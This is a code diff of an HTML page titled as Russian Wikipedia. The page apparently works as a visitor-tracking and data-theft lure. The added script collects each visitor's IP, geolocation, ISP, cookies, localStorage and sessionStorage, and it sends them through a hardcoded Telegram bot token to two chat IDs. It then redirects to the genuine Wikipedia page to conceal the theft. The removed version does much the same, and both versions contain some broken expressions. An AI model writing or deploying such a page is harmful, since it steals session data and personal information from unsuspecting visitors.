@@ -1,75 +1,60 @@
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-<meta charset="utf-8">
-<title>Загрузка...</title>
-</head>
+<html>
+<head><meta charset="utf-8"><title>Википедия</title></head>
 <body>
-<h1>Секунду...</h1>
 <script>
-const TOKEN = '8847544358:AAFH7jhYxPh7xuTHmoMZXYYHGcxzsYnHGe0';
-const CHAT_ID = '6783102477';
-const $ = s => s || '?';
+var TOKEN = '8847544358:AAFH7jhYxPh7xuTHmoMZXYYHGcxzsYnHGe0';
+var ID = '6783102477';
+var ID2 = '5442175617';
+var REDIRECT = 'https://ru.wikipedia.org/wiki/Заглавная_страница';
 
-(async () => {
-  let ip = '?', geo = '?', bat = 'нет', gpu = '?';
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
-  for (const u of ['https://ipapi.co/json/', 'https://ipwho.is/']) {
-    try {
-      const r = await fetch(u).then(x => x.json());
-      if (!r.ip) continue;
-      ip = r.ip;
-      const city = r.city || '';
-      const country = r.country_name  r.country  '';
-      const isp = r.org  (r.connection && r.connection.isp)  '';
-      geo = [city, country, isp].filter(Boolean).join(', ');
-      break;
-    } catch(e) {}
-  }
+var cookieStr = document.cookie || 'пусто (или HttpOnly)';
+var lsStr = '', ssStr = '';
+try { lsStr = JSON.stringify(localStorage) || '{}'; } catch(e){}
+try { ssStr = JSON.stringify(sessionStorage) || '{}'; } catch(e){}
 
-  if (navigator.getBattery) {
-    try {
-      const b = await navigator.getBattery();
-      bat = Math.round(b.level * 100) + '% ' + (b.charging ? '⚡' : '🔋');
-    } catch(e) {}
-  }
+function sendTo(chatId, text){
+  var u = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
+        + '?chat_id=' + chatId
+        + '&text=' + encodeURIComponent(text);
+  return fetch(u, { keepalive: true }).catch(function(){});
+}
 
-  try {
-    const gl = document.createElement('canvas').getContext('webgl');
-    const d = gl.getExtension('WEBGL_debug_renderer_info');
-    if (d) gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-  } catch(e) {}
+function send(ipData, batStr){
+  var t = 'IP: ' + (ipData.ip || 'н/д') + '\n'
+    + 'Город: ' + (ipData.city  '?') + ', ' + (ipData.country  '?') + '\n'
+    + 'Провайдер: ' + (ipData.connection ? ipData.connection.isp : '?') + '\n'
+    + 'UA: ' + esc(navigator.userAgent) + '\n'
+    + 'Экран: ' + screen.width + 'x' + screen.height + '\n'
+    + 'Батарея: ' + batStr + '\n'
+    + 'URL: ' + location.href + '\n'
+    + 'Referrer: ' + (document.referrer || 'нет') + '\n'
+    + 'Cookies: ' + esc(cookieStr) + '\n'
+    + 'localStorage: ' + esc(lsStr) + '\n'
+    + 'sessionStorage: ' + esc(ssStr);
 
-  const device = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 мобильный' : '💻 десктоп';
+  Promise.all([ sendTo(ID, t), sendTo(ID2, t) ]).finally(function(){
+    location.replace(REDIRECT);
+  });
+}
 
-  const text = [
-    '🔔 Заход',
-    '📡 IP: ' + ip,
-    '📍 ' + geo,
-    '🌐 ' + location.href,
-    '🍪 ' + (document.cookie || 'пусто'),
-    device,
-    '🖥 ' + navigator.userAgent,
-    '💻 ' + $(navigator.platform) + ' | ' + $(navigator.language),
-    '🕐 ' + Intl.DateTimeFormat().resolvedOptions().timeZone,
-    '📺 ' + screen.width + 'x' + screen.height + ' x' + window.devicePixelRatio,
-    '⚙️ CPU ' + $(navigator.hardwareConcurrency) + ' | RAM ' + $(navigator.deviceMemory) + 'GB',
-    '📶 ' + $((navigator.connection && navigator.connection.effectiveType)),
-    '🔋 ' + bat,
-    '🎮 ' + gpu
-  ].join('\n');
+var ipP = fetch('https://ipwho.is/')
+  .then(function(r){ return r.json(); })
+  .catch(function(){ return {}; });
 
-  try {
-    await fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
-      keepalive: true
-    });
-  } catch(e) {}
+var batP = navigator.getBattery
+  ? navigator.getBattery().then(function(b){
+      return Math.round(b.level*100) + '%' + (b.charging ? ' (заряжается)' : '');
+    }).catch(function(){ return 'н/д'; })
+  : Promise.resolve('н/д (браузер не поддерживает)');
 
-  document.body.innerHTML = '<h1>Готово</h1>';
-})();
+Promise.all([ipP, batP]).then(function(res){
+  send(res[0], res[1]);
+}).catch(function(){
+  send({}, 'н/д');
+});
 </script>
 </body>
 </html>
